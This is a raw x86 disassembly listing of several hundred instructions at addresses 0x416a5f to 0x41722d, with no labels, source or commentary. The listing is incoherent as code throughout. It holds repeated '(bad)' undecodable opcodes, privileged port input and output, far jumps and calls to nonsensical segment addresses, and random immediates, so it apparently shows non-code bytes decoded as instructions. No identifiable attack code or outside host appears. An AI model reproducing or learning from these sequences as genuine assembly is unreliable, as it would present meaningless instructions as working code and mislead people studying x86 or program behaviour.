  416a5f:	cmp    al,0x48
  416a61:	xchg   ebx,eax
  416a62:	aaa    
  416a63:	xchg   edx,eax
  416a64:	mov    cl,0xa8
  416a66:	mov    WORD PTR [ecx-0x3b353325],gs
  416a6c:	cdq    
  416a6d:	sub    cl,cl
  416a6f:	test   BYTE PTR [ebx-0x7ca5da53],ch
  416a75:	push   edi
  416a76:	popf   
  416a77:	pushf  
  416a78:	sub    eax,0x7e919e4b
  416a7d:	mov    edi,0x91b91233
  416a82:	jg     0x416ae8
  416a84:	jns    0x416ab8
  416a86:	dec    esp
  416a87:	mov    ebx,ss
  416a89:	repnz sbb eax,0x85111d5e
  416a8f:	test   DWORD PTR ds:[eax-0x29],0x923ede99
  416a97:	enter  0xf577,0xf3
  416a9b:	out    dx,eax
  416a9c:	ret    
  416a9d:	inc    ecx
  416a9e:	dec    ecx
  416a9f:	push   edi
  416aa0:	mov    dl,0x97
  416aa2:	gs loop 0x416a92
  416aa5:	enter  0xa4a2,0xea
  416aa9:	shr    BYTE PTR [edx+ebp*2],cl
  416aac:	aas    
  416aad:	int    0xbe
  416aaf:	fmul   DWORD PTR [ebx+0x71]
  416ab2:	xchg   edi,eax
  416ab3:	outs   dx,BYTE PTR ds:[esi]
  416ab4:	jmp    0x659fadeb
  416ab9:	test   BYTE PTR [ebp+0x4e4702fe],ah
  416abf:	out    0xfe,eax
  416ac1:	and    esi,DWORD PTR [ebx-0x1e]
  416ac4:	lods   eax,DWORD PTR ds:[esi]
  416ac5:	(bad)  
  416ac6:	push   edx
  416ac7:	push   eax
  416ac8:	dec    esi
  416ac9:	bound  ebp,QWORD PTR [esi+0x5c8c4890]
  416acf:	push   ds
  416ad0:	inc    esi
  416ad1:	xchg   edi,eax
  416ad2:	scas   al,BYTE PTR es:[edi]
  416ad3:	sub    eax,0xd33885bc
  416ad8:	mov    dh,0xf7
  416ada:	dec    esp
  416adb:	lock xor esp,DWORD PTR [eax]
  416ade:	fsubp  st(2),st
  416ae0:	in     al,0x58
  416ae2:	jno    0x416af7
  416ae4:	jae    0x416ae9
  416ae6:	aam    0x41
  416ae8:	mov    dl,0x8f
  416aea:	cdq    
  416aeb:	mov    eax,eax
  416aed:	lea    edi,[edx+0x55c0938a]
  416af3:	adc    bl,BYTE PTR [edx+ebp*4]
  416af6:	adc    dl,BYTE PTR [eax+0x429a5e1]
  416afc:	in     eax,0xaa
  416afe:	gs cs add al,0x4f
  416b02:	int    0x6d
  416b04:	jbe    0x416aba
  416b06:	and    eax,0x42592fdf
  416b0b:	inc    DWORD PTR [ebx+0x17a24863]
  416b11:	xchg   DWORD PTR [edx-0x45490b7c],esp
  416b17:	in     eax,0x8f
  416b19:	jp     0x416ae6
  416b1b:	jge    0x416b3d
  416b1d:	mov    dh,0x88
  416b1f:	inc    esi
  416b20:	outs   dx,DWORD PTR ds:[esi]
  416b21:	mul    ecx
  416b23:	jg     0x416b52
  416b25:	add    ecx,edx
  416b27:	push   es
  416b28:	mov    WORD PTR [esi+0x78],cs
  416b2b:	push   ss
  416b2c:	mov    ds:0x9c639370,eax
  416b31:	js     0x416ab5
  416b33:	xchg   edx,eax
  416b34:	ret    
  416b35:	(bad)  
  416b36:	out    dx,eax
  416b37:	mov    ch,0x18
  416b39:	pop    edi
  416b3a:	sahf   
  416b3b:	pop    esp
  416b3c:	pop    edx
  416b3d:	jecxz  0x416b96
  416b3f:	fist   WORD PTR [eax]
  416b41:	ins    DWORD PTR es:[edi],dx
  416b42:	xchg   edi,eax
  416b43:	sbb    eax,0x82136ecc
  416b48:	call   0x8e4c:0x9ee3c2b5
  416b4f:	fcmove st,st(4)
  416b51:	cmp    DWORD PTR [ecx*4+0x3ca81690],esp
  416b58:	fwait
  416b59:	xchg   ebx,eax
  416b5a:	dec    esp
  416b5b:	test   BYTE PTR [edi],bh
  416b5d:	scas   al,BYTE PTR es:[edi]
  416b5e:	(bad)  
  416b5f:	and    BYTE PTR ss:[eax-0x4f4713fb],bh
  416b66:	sbb    BYTE PTR [esi-0x2c],bh
  416b69:	push   cs
  416b6a:	cli    
  416b6b:	adc    ch,bh
  416b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b6e:	pop    ecx
  416b6f:	cmp    esp,DWORD PTR [eax]
  416b71:	sbb    DWORD PTR [ebp-0x5637791b],0x3b
  416b78:	or     eax,0x3aef548f
  416b7d:	jns    0x416b13
  416b7f:	int3   
  416b80:	jg     0x416bef
  416b82:	sar    ebp,cl
  416b84:	xchg   DWORD PTR [ecx+0x5d],ebx
  416b87:	mov    dh,BYTE PTR [eax-0x2]
  416b8a:	jl     0x416bf9
  416b8c:	rcl    DWORD PTR [eax-0x5f],cl
  416b8f:	retf   
  416b90:	push   ebp
  416b91:	ins    DWORD PTR es:[edi],dx
  416b92:	push   esi
  416b93:	iret   
  416b94:	fidivr DWORD PTR [ebp+0x280257ce]
  416b9a:	shl    al,cl
  416b9c:	dec    eax
  416b9d:	mov    esi,0x2cecba5b
  416ba2:	(bad)  
  416ba3:	push   edx
  416ba4:	into   
  416ba5:	xor    ch,BYTE PTR [ecx-0x35]
  416ba8:	(bad)  
  416ba9:	mov    edi,0x2299e16d
  416bae:	pop    esp
  416baf:	ret    0xfc3f
  416bb2:	dec    eax
  416bb3:	add    eax,0x14154635
  416bb8:	mov    esp,0xca67e558
  416bbd:	sub    al,0x1e
  416bbf:	mov    bh,0xb4
  416bc1:	sahf   
  416bc2:	std    
  416bc3:	cmp    eax,0xc852aa1b
  416bc8:	ror    cl,0xa2
  416bcb:	xor    BYTE PTR [eax],0x95
  416bce:	fs (bad) 
  416bd0:	cmp    DWORD PTR [edi+0x29],edx
  416bd3:	jb     0x416be8
  416bd5:	and    BYTE PTR [edx+0x36f9a27b],ch
  416bdb:	(bad)  
  416bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bdd:	mov    ebx,0xb57da973
  416be2:	jg     0x416b74
  416be4:	xchg   esi,eax
  416be5:	or     eax,0xcba89a11
  416bea:	push   edx
  416beb:	and    bl,bl
  416bed:	out    dx,al
  416bee:	mov    ds:0x2adb0a34,al
  416bf3:	cmp    al,0x26
  416bf5:	push   0x253c965d
  416bfa:	jl     0x416b86
  416bfc:	sub    BYTE PTR [ebp-0x3ccb885],bh
  416c02:	xchg   ebp,eax
  416c03:	fs pop esi
  416c05:	jp     0x416c28
  416c07:	sub    al,BYTE PTR [eax]
  416c09:	adc    edx,0x12
  416c0c:	cmp    DWORD PTR [esi-0xbe821ad],0x8c67ead0
  416c16:	je     0x416c57
  416c18:	test   eax,0xc28907b7
  416c1d:	in     al,dx
  416c1e:	push   0x17
  416c20:	fbld   TBYTE PTR [ebp+eax*2+0x21e9f718]
  416c27:	inc    ebx
  416c28:	mov    esi,0x1540293c
  416c2d:	inc    esi
  416c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c2f:	loope  0x416c89
  416c31:	or     ebx,edi
  416c33:	dec    ebx
  416c34:	mov    esi,0xe000e650
  416c39:	(bad)  
  416c3b:	cmp    DWORD PTR [edx+0x434f861e],esi
  416c41:	mov    ds:0x4ac35798,al
  416c46:	das    
  416c47:	pop    ss
  416c48:	adc    eax,esi
  416c4a:	pop    DWORD PTR [ebp-0x67]
  416c4d:	jnp    0x416ca9
  416c4f:	push   ds
  416c50:	or     ebx,DWORD PTR [edx+0x57e6c8f1]
  416c56:	add    BYTE PTR [eax],cl
  416c58:	into   
  416c59:	enter  0xbb45,0xe5
  416c5d:	push   ss
  416c5e:	enter  0x62d5,0x5a
  416c62:	lea    eax,[ebx-0x74b66496]
  416c68:	inc    ebp
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	push   edx
  416c7c:	adc    ecx,DWORD PTR [ebp-0x29]
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416ce0
  416c88:	mov    al,0x97
  416c8a:	inc    ecx
  416c8b:	in     al,dx
  416c8c:	adc    eax,0x43f1edbc
  416c91:	sbb    al,0x56
  416c93:	push   cs
  416c94:	rcr    DWORD PTR ds:0xe2c5ad5c,cl
  416c9a:	inc    edx
  416c9b:	outs   dx,BYTE PTR ds:[esi]
  416c9c:	adc    DWORD PTR [ebx+0x40],ecx
  416c9f:	inc    esi
  416ca0:	jo     0x416ce2
  416ca2:	aaa    
  416ca3:	xor    edx,DWORD PTR [esi]
  416ca5:	daa    
  416ca6:	scas   eax,DWORD PTR es:[edi]
  416ca7:	adc    esp,0xb45cd14b
  416cad:	jl     0x416cdf
  416caf:	aam    0x9d
  416cb1:	sbb    cl,BYTE PTR [esi]
  416cb3:	jmp    0x53db:0x63ed7c8
  416cba:	sahf   
  416cbb:	(bad)  
  416cbc:	iret   
  416cbd:	lds    ecx,FWORD PTR ds:0xa9cfcea
  416cc3:	push   ebp
  416cc4:	jle    0x416c86
  416cc6:	push   cs
  416cc7:	or     BYTE PTR [edi+esi*4],dl
  416cca:	ins    BYTE PTR es:[edi],dx
  416ccb:	ret    
  416ccc:	iret   
  416ccd:	mov    cs,ebp
  416ccf:	and    BYTE PTR [ebx],ah
  416cd1:	sar    BYTE PTR [ecx+edx*1-0x3b61dbea],1
  416cd8:	ins    DWORD PTR es:[edi],dx
  416cd9:	popa   
  416cda:	aaa    
  416cdb:	enter  0xf53f,0x8
  416cdf:	jmp    0x2ef3:0xc108d3a9
  416ce6:	repnz neg DWORD PTR [edx+0x23]
  416cea:	cmp    ecx,edi
  416cec:	jmp    0x416cc4
  416cee:	lock sbb ecx,0x43
  416cf2:	add    edi,DWORD PTR [eax+0x21]
  416cf5:	add    eax,DWORD PTR [ebx-0x11924965]
  416cfb:	adc    eax,0xf6e42bb2
  416d00:	and    al,0x1b
  416d02:	(bad)  
  416d03:	fmul   DWORD PTR [ebp-0x5e]
  416d06:	mov    ch,0xa0
  416d08:	push   esi
  416d09:	pop    es
  416d0a:	mov    ds:0xb2633c4c,al
  416d0f:	mov    ebx,0xc0606db0
  416d14:	lods   al,BYTE PTR ds:[esi]
  416d15:	fbstp  TBYTE PTR ds:0xf4388989
  416d1b:	pop    ds
  416d1c:	mov    esp,0xad87b077
  416d21:	push   ss
  416d22:	pop    es
  416d23:	push   ss
  416d24:	les    edi,FWORD PTR [eax-0x77cacccf]
  416d2a:	outs   dx,BYTE PTR ds:[esi]
  416d2b:	sahf   
  416d2c:	inc    ebp
  416d2d:	imul   ah
  416d2f:	ds xor al,0xfe
  416d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d33:	lock xlat BYTE PTR ds:[ebx]
  416d35:	pop    ebp
  416d36:	cmp    al,0xf0
  416d38:	(bad)  
  416d3a:	sub    al,0x11
  416d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d3d:	clc    
  416d3e:	(bad)  
  416d3f:	pop    ecx
  416d40:	out    0x4b,al
  416d42:	mov    edi,0x944d094
  416d47:	cs mov eax,es
  416d4a:	test   eax,0xd5a5bc9f
  416d4f:	in     al,0xf7
  416d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d52:	into   
  416d53:	cmp    edi,DWORD PTR [ebp+ecx*4-0x3346dc33]
  416d5a:	test   BYTE PTR [ebx],0xd4
  416d5d:	sbb    eax,0x2e4cfc38
  416d62:	or     eax,0x1a2855d1
  416d67:	xor    al,BYTE PTR [esi+ebp*4]
  416d6a:	mov    DWORD PTR [eax],edi
  416d6c:	inc    eax
  416d6d:	ja     0x416d31
  416d6f:	mov    ds:0x34e877de,al
  416d74:	lea    edi,[edi-0x39b05789]
  416d7a:	jge    0x416d74
  416d7c:	cmp    dh,BYTE PTR [ebp+0x62]
  416d7f:	retf   
  416d80:	setbe  BYTE PTR [edx-0x29e84418]
  416d87:	jecxz  0x416e05
  416d89:	xchg   DWORD PTR [edx+0x67],ebp
  416d8c:	iret   
  416d8d:	shl    BYTE PTR [edi+0x65],0x17
  416d91:	jmp    0x416dfb
  416d93:	pop    esp
  416d94:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d96:	sti    
  416d97:	sbb    edx,DWORD PTR [ecx]
  416d99:	test   ecx,esp
  416d9b:	ret    
  416d9c:	inc    esp
  416d9d:	gs adc al,0x4
  416da0:	jbe    0x416d3b
  416da2:	pop    esi
  416da3:	pop    es
  416da4:	ins    BYTE PTR es:[edi],dx
  416da5:	mov    al,ds:0x244717e4
  416daa:	fild   QWORD PTR [ebx+ebp*2]
  416dad:	in     eax,dx
  416dae:	sbb    bh,BYTE PTR [esi+0x7b]
  416db1:	les    eax,FWORD PTR [ecx-0x3]
  416db4:	and    al,0xb3
  416db6:	je     0x416e23
  416db8:	lahf   
  416db9:	int3   
  416dba:	test   eax,0x9c314f10
  416dbf:	int3   
  416dc0:	cmp    al,0x5a
  416dc2:	es mov edi,0xbfcbe142
  416dc8:	test   DWORD PTR [edx],edi
  416dca:	loopne 0x416dfe
  416dcc:	sahf   
  416dcd:	imul   edi,DWORD PTR [edi],0xffffffe0
  416dd0:	sbb    ebx,DWORD PTR [edx-0x101fdf93]
  416dd6:	aam    0x14
  416dd8:	xchg   esp,eax
  416dd9:	mov    edi,DWORD PTR [edi]
  416ddb:	jle    0x416dca
  416ddd:	jo     0x416dd2
  416ddf:	mov    ds:0x6620f720,al
  416de4:	jb     0x416dd8
  416de6:	sbb    al,0xca
  416de8:	mov    BYTE PTR [ebx+0xa15dade],bl
  416dee:	and    eax,0x1a50d832
  416df3:	sub    BYTE PTR [edi+0x2ec9bf2],ch
  416df9:	(bad)  
  416dfa:	fdiv   DWORD PTR [edx-0x787fa2c2]
  416e00:	lods   al,BYTE PTR ds:[esi]
  416e01:	mov    ecx,0xc1ca005b
  416e06:	(bad)  
  416e08:	bound  ecx,QWORD PTR [ebp-0x4a928702]
  416e0e:	pushf  
  416e0f:	mov    BYTE PTR [ebx+edx*8+0x1351b50f],ch
  416e16:	push   cs
  416e17:	mov    cl,BYTE PTR [edx-0x67afaaf3]
  416e1d:	mov    al,0x79
  416e1f:	jne    0x416e02
  416e21:	sbb    BYTE PTR [ebx+edx*8+0x1b2afa55],bh
  416e28:	mov    ds:0xc4b35415,al
  416e2d:	xchg   edx,eax
  416e2e:	xchg   edx,eax
  416e2f:	push   ecx
  416e30:	sbb    BYTE PTR [ecx],0x98
  416e33:	and    esp,DWORD PTR [eax+0x6340723f]
  416e39:	popf   
  416e3a:	jns    0x416e61
  416e3c:	mov    eax,ds:0xc83bc7bf
  416e41:	cmp    eax,0x5a74f51c
  416e46:	shl    BYTE PTR [edx+0x763f1984],0x97
  416e4d:	ss push edx
  416e4f:	call   0x5b77:0x624e13fe
  416e56:	jle    0x416e5d
  416e58:	fisttp QWORD PTR [edi-0x6b1d9b3f]
  416e5e:	push   edi
  416e5f:	icebp  
  416e60:	mov    al,ds:0x545bf484
  416e65:	inc    ebx
  416e66:	or     eax,0xdb3211e
  416e6b:	dec    DWORD PTR [edi-0x147fc789]
  416e71:	xchg   BYTE PTR [ebx],dh
  416e73:	mov    ds:0xf48f2b71,al
  416e78:	dec    esp
  416e79:	inc    ebx
  416e7a:	and    BYTE PTR [eax-0x6028a8ef],al
  416e80:	dec    edx
  416e81:	inc    esp
  416e82:	call   0xd97a:0x1abb8df
  416e89:	mov    al,ds:0x4c2b6706
  416e8e:	or     al,0x24
  416e90:	out    0x85,al
  416e92:	mov    edi,ss
  416e94:	xchg   edx,eax
  416e95:	and    al,BYTE PTR [edi+0x30]
  416e98:	lock clc 
  416e9a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  416e9c:	cmp    ah,BYTE PTR [edx+0x70b4dcdd]
  416ea2:	xor    eax,0xca1c640d
  416ea7:	jle    0x416f13
  416ea9:	cli    
  416eaa:	push   DWORD PTR [edi+0x7c789148]
  416eb0:	rcr    BYTE PTR ds:0x3e59933b,0xe7
  416eb7:	in     eax,dx
  416eb8:	scas   al,BYTE PTR es:[edi]
  416eb9:	sub    ecx,DWORD PTR [esi]
  416ebb:	jecxz  0x416e88
  416ebd:	adc    BYTE PTR [ebp-0x20430e5a],bh
  416ec3:	cld    
  416ec4:	adc    DWORD PTR [ebx],esp
  416ec6:	mov    al,0x13
  416ec8:	dec    esp
  416ec9:	mov    al,ds:0x435ce0eb
  416ece:	dec    esi
  416ecf:	aam    0xc1
  416ed1:	imul   esp,DWORD PTR [esi-0x8],0xe78e3ac4
  416ed8:	or     BYTE PTR [edi],0x87
  416edb:	scas   eax,DWORD PTR es:[edi]
  416edc:	mov    ds:0x1e9122b0,al
  416ee1:	in     eax,dx
  416ee2:	xchg   ebp,eax
  416ee3:	fisubr DWORD PTR [esi+0x62]
  416ee6:	xor    bh,al
  416ee8:	test   DWORD PTR [edx],ebx
  416eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416eeb:	inc    edx
  416eec:	jo     0x416f65
  416eee:	das    
  416eef:	mul    DWORD PTR [edi-0x77]
  416ef2:	les    edx,FWORD PTR [edi-0x5df5fc1d]
  416ef8:	and    edi,DWORD PTR [ebp-0x27]
  416efb:	cmp    al,0x3
  416efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416efe:	fldcw  WORD PTR [ebx*4+0x7cb71b0a]
  416f05:	or     eax,0xd2a82e01
  416f0a:	pusha  
  416f0b:	ret    0x9e48
  416f0e:	lahf   
  416f0f:	push   ecx
  416f10:	adc    eax,0xec278eb4
  416f15:	int    0x46
  416f17:	sub    DWORD PTR [ecx],0x85a6d61
  416f1d:	xor    DWORD PTR [esi+0x2be169c5],ebp
  416f23:	cdq    
  416f24:	adc    ah,BYTE PTR [edi+0x3]
  416f27:	fwait
  416f28:	or     BYTE PTR [ebx-0x58],0x94
  416f2c:	pusha  
  416f2d:	(bad)  
  416f2e:	mov    al,ds:0x1617fcdf
  416f33:	cld    
  416f34:	jg     0x416f16
  416f36:	sahf   
  416f37:	sub    ch,BYTE PTR [ecx]
  416f39:	es adc eax,0xdfcd4f38
  416f3f:	jae    0x416f60
  416f41:	push   es
  416f42:	mov    bl,0x8
  416f44:	cmp    BYTE PTR ds:0xae99ceca,ah
  416f4a:	fmul   DWORD PTR [esi-0x50f01b17]
  416f50:	rol    DWORD PTR [ebx],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f6b:	mov    esp,0x193739fa
  416f70:	jg     0x416fe2
  416f72:	mov    ecx,0x4970707e
  416f77:	daa    
  416f78:	jmp    ebp
  416f7a:	in     al,0xe
  416f7c:	xchg   ecx,eax
  416f7d:	cmp    al,0xc7
  416f7f:	cmp    BYTE PTR [edi+0x6c9fc72c],bl
  416f85:	mov    ah,0x4d
  416f87:	inc    edi
  416f88:	dec    ebp
  416f89:	dec    eax
  416f8a:	mov    al,0x6d
  416f8c:	repnz xchg ebx,eax
  416f8e:	mov    gs,WORD PTR [esi]
  416f90:	popf   
  416f91:	ja     0x416f42
  416f93:	dec    ebp
  416f94:	push   ebp
  416f95:	mov    dl,0xa3
  416f97:	and    eax,0x57a8e4e6
  416f9c:	nop
  416f9d:	jo     0x416f41
  416f9f:	push   ds
  416fa0:	ins    DWORD PTR es:[edi],dx
  416fa1:	jmp    0xfb482c01
  416fa6:	sub    eax,0x3668cf45
  416fab:	idiv   BYTE PTR [esp+eax*1+0x65]
  416faf:	icebp  
  416fb0:	leave  
  416fb1:	adc    ax,WORD PTR [edx]
  416fb4:	lock sbb ebx,DWORD PTR [ebx-0x7cb7341a]
  416fbb:	lods   al,BYTE PTR ds:[esi]
  416fbc:	ret    
  416fbd:	enter  0x8105,0xad
  416fc1:	fisubr WORD PTR [bx]
  416fc4:	adc    al,0x21
  416fc6:	dec    edi
  416fc7:	xchg   ebp,eax
  416fc8:	loop   0x416f51
  416fca:	pop    esi
  416fcb:	push   esi
  416fcc:	push   edi
  416fcd:	mov    bl,0xb2
  416fcf:	dec    esi
  416fd0:	fnstsw WORD PTR ds:0x37ac2329
  416fd6:	mov    bl,0xed
  416fd8:	rcr    bh,0x99
  416fdb:	int    0x15
  416fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fde:	inc    esi
  416fdf:	xchg   esi,eax
  416fe0:	dec    ebp
  416fe1:	shl    DWORD PTR [ebx+0x65],0x10
  416fe5:	cmp    ah,BYTE PTR [edi]
  416fe7:	mov    al,ds:0xcc4c0e18
  416fec:	push   esi
  416fed:	xor    DWORD PTR [ecx],ebp
  416fef:	xor    bh,dh
  416ff1:	push   edx
  416ff2:	pop    esi
  416ff3:	inc    edi
  416ff4:	adc    al,0x40
  416ff6:	fsubr  DWORD PTR [ecx-0x7e]
  416ff9:	ins    BYTE PTR es:[edi],dx
  416ffa:	and    dh,ch
  416ffc:	push   cs
  416ffd:	enter  0x8e71,0x13
  417001:	sub    ebp,ebp
  417003:	pushf  
  417004:	jbe    0x41701d
  417006:	and    cl,BYTE PTR [eax+0x4e3c9120]
  41700c:	rcl    ebp,1
  41700e:	mov    ch,0xd4
  417010:	add    eax,0x9ebcc303
  417015:	cmp    esi,DWORD PTR [ebp+0x59]
  417018:	popa   
  417019:	sbb    ebx,DWORD PTR [ebp-0x9e67f10]
  41701f:	int3   
  417020:	loope  0x417088
  417022:	pusha  
  417023:	xor    ebx,0xb8337d31
  417029:	cmc    
  41702a:	inc    ecx
  41702b:	push   ebx
  41702c:	mov    cl,0xd5
  41702e:	jno    0x416fdf
  417030:	mov    ah,0xd0
  417032:	mov    ch,0x64
  417034:	and    DWORD PTR [ecx],0xfffffff1
  417037:	jnp    0x417094
  417039:	mov    ecx,0x82aa90c3
  41703e:	fst    QWORD PTR [eax+0x1f]
  417041:	dec    esp
  417042:	lods   eax,DWORD PTR ds:[esi]
  417043:	mov    dh,0x21
  417045:	adc    DWORD PTR gs:[edx+0x26fd5be0],ecx
  41704c:	test   dh,ah
  41704e:	dec    esi
  41704f:	jo     0x416fe1
  417051:	jae    0x417096
  417053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417054:	mov    ah,0xda
  417056:	cmp    BYTE PTR [esi-0x30f90091],al
  41705c:	xchg   dl,bl
  41705e:	adc    bl,cl
  417060:	and    edx,ebp
  417062:	test   eax,0x621426f4
  417067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417068:	arpl   WORD PTR [edi-0x58],cx
  41706b:	das    
  41706c:	mov    dl,0x2c
  41706e:	mov    ah,0x7d
  417070:	clc    
  417071:	lahf   
  417072:	adc    eax,0x951bfacf
  417077:	neg    BYTE PTR [eax+0x5ec61e0d]
  41707d:	int3   
  41707e:	test   DWORD PTR [ecx],0xead65c29
  417084:	ins    BYTE PTR es:[edi],dx
  417085:	xor    al,0xdf
  417087:	xchg   ecx,eax
  417088:	ror    BYTE PTR [ebx],0xd5
  41708b:	inc    ecx
  41708c:	sbb    ecx,DWORD PTR [esi+0xbc30623]
  417092:	adc    edx,DWORD PTR [edx+0x45]
  417095:	mov    edx,0x7f34f151
  41709a:	lahf   
  41709b:	xor    al,0xb5
  41709d:	pusha  
  41709e:	je     0x4170d6
  4170a0:	jle    0x4170c9
  4170a2:	dec    eax
  4170a3:	pushf  
  4170a4:	push   0x3d
  4170a6:	dec    edx
  4170a7:	xor    al,0x1b
  4170a9:	in     al,dx
  4170aa:	xchg   ecx,eax
  4170ab:	xchg   ebp,eax
  4170ac:	aaa    
  4170ad:	push   edx
  4170ae:	mov    bl,BYTE PTR [ebp+0x2e]
  4170b1:	xchg   DWORD PTR [edx],eax
  4170b3:	pop    esi
  4170b4:	xrelease mov DWORD PTR [edx],ecx
  4170b7:	xor    al,BYTE PTR [edx]
  4170b9:	mov    al,ds:0x7c588381
  4170be:	xor    esp,DWORD PTR [eax]
  4170c0:	cmp    edx,esp
  4170c2:	mov    ds:0x1add65fc,al
  4170c7:	jno    0x4170ea
  4170c9:	cdq    
  4170ca:	loop   0x41711f
  4170cc:	cmp    eax,0x7c4b5436
  4170d1:	or     eax,0x3d262950
  4170d6:	shr    DWORD PTR [eax],0x90
  4170d9:	xchg   ecx,eax
  4170da:	popa   
  4170db:	pop    edi
  4170dc:	mov    bl,0x58
  4170de:	push   cs
  4170df:	pop    ebx
  4170e0:	bound  esp,QWORD PTR ds:0xb71634b1
  4170e6:	adc    edx,DWORD PTR [esi+0x65f6dab0]
  4170ec:	xchg   ebx,ebp
  4170ee:	sete   BYTE PTR [ebx+0x28]
  4170f2:	sbb    BYTE PTR [ebx-0xd],ah
  4170f5:	js     0x41714d
  4170f7:	aam    0x72
  4170f9:	and    eax,0xbf0d4fa1
  4170fe:	popa   
  4170ff:	mov    WORD PTR [esi+0x375bc28e],es
  417105:	test   al,0xe6
  417107:	mov    edx,0x1b1c5b3c
  41710c:	cmp    DWORD PTR [edx-0x36],edi
  41710f:	adc    al,cl
  417111:	or     ch,BYTE PTR [edi]
  417113:	mov    bh,0xcd
  417115:	mov    ebp,0x8e0461ff
  41711a:	aad    0xf0
  41711c:	mov    ds:0xb61a9606,eax
  417121:	pop    ecx
  417122:	mov    edi,0xcb364cdf
  417127:	call   0xa373:0xfcd693de
  41712e:	xor    edi,DWORD PTR [ebx-0xb]
  417131:	repnz aam 0x3
  417134:	cmp    esi,DWORD PTR [edx-0x1a]
  417137:	push   edx
  417138:	sub    ah,BYTE PTR [ebp+0x2c56287]
  41713e:	rcr    BYTE PTR [edi],1
  417140:	fucom  st(3)
  417142:	(bad)  
  417143:	mov    edi,0xa1eac9be
  417148:	push   eax
  417149:	adc    DWORD PTR [eax+0x3d9ebd8],edx
  41714f:	fld    TBYTE PTR [edi+edx*1-0x7702102e]
  417156:	sti    
  417157:	mov    ebx,DWORD PTR [edi+0x31]
  41715a:	jns    0x417189
  41715c:	pop    ebp
  41715d:	mov    edx,0x746036e4
  417162:	push   edx
  417163:	into   
  417164:	push   edi
  417165:	jle    0x4170ef
  417167:	add    al,0x68
  417169:	gs push edi
  41716b:	adc    ecx,DWORD PTR cs:[ebx+ecx*2]
  41716f:	dec    edi
  417170:	xlat   BYTE PTR ds:[ebx]
  417171:	iret   
  417172:	icebp  
  417173:	leave  
  417174:	push   0xcc268d6a
  417179:	dec    edx
  41717a:	push   cs
  41717b:	in     al,0xcd
  41717d:	mov    edx,0x8e87669
  417182:	sbb    esi,DWORD PTR ds:0x9ce1a1cd
  417188:	jmp    0xa305:0xb9f58119
  41718f:	aaa    
  417190:	icebp  
  417191:	jbe    0x417165
  417193:	sub    al,0x7d
  417195:	sbb    esp,DWORD PTR [edi+0x3e74331b]
  41719b:	sub    eax,0xecaf1941
  4171a0:	mov    BYTE PTR [ebp+0x495aae0],bl
  4171a6:	inc    edx
  4171a7:	out    dx,eax
  4171a8:	stos   BYTE PTR es:[edi],al
  4171a9:	jmp    0x417210
  4171ab:	inc    esp
  4171ac:	cdq    
  4171ad:	xor    eax,DWORD PTR [ecx+0x7b]
  4171b0:	pop    ebx
  4171b1:	jnp    0x417146
  4171b3:	fsubp  st(1),st
  4171b5:	out    dx,al
  4171b6:	pop    ebx
  4171b7:	jnp    0x41716c
  4171b9:	fdivr  DWORD PTR [ebp+esi*1+0x70]
  4171bd:	in     eax,dx
  4171be:	jae    0x417200
  4171c0:	mov    edi,0x2104976d
  4171c5:	loope  0x41719a
  4171c7:	sbb    eax,0x2bf53738
  4171cc:	hlt    
  4171cd:	inc    esi
  4171ce:	cmc    
  4171cf:	xchg   BYTE PTR [eax+0x3f],dh
  4171d2:	shr    al,cl
  4171d4:	mov    WORD PTR [edi-0x28],?
  4171d7:	enter  0xde26,0xce
  4171db:	fmul   DWORD PTR [edx-0x422ed34a]
  4171e1:	lea    ebp,[edi+0x1a]
  4171e4:	lods   al,BYTE PTR ds:[esi]
  4171e5:	adc    eax,0xd6318acf
  4171ea:	push   esi
  4171eb:	iret   
  4171ec:	jns    0x41723e
  4171ee:	push   edi
  4171ef:	pop    ecx
  4171f0:	cmp    BYTE PTR [edx-0x38],bl
  4171f3:	pusha  
  4171f4:	cmp    al,BYTE PTR [ebp-0x77a0b5c8]
  4171fa:	fs jo  0x4171aa
  4171fd:	fcomp  QWORD PTR [eax]
  4171ff:	mov    ch,bl
  417201:	mov    al,0x53
  417203:	cli    
  417204:	lahf   
  417205:	dec    ecx
  417206:	mov    ah,0x7f
  417208:	xchg   ebx,eax
  417209:	mov    ch,0x9c
  41720b:	(bad)  
  41720c:	add    ebp,eax
  41720e:	repz or eax,0x6d7c8dd
  417214:	outs   dx,BYTE PTR ds:[esi]
  417215:	popf   
  417216:	cmp    DWORD PTR [edi],edi
  417218:	jg     0x417293
  41721a:	and    ebp,edi
  41721c:	push   ebp
  41721d:	les    edx,FWORD PTR [edi]
  41721f:	mov    DWORD PTR [ebx-0x12],edx
  417222:	cwde   
  417223:	jg     0x417293
  417225:	push   ebx
  417226:	xor    bl,bl
  417228:	xchg   esp,eax
  417229:	into   
  41722a:	gs out 0xe,eax
  41722d:	xor    DWORD PTR ds:[eax+0xfb168d0],0xffffff96
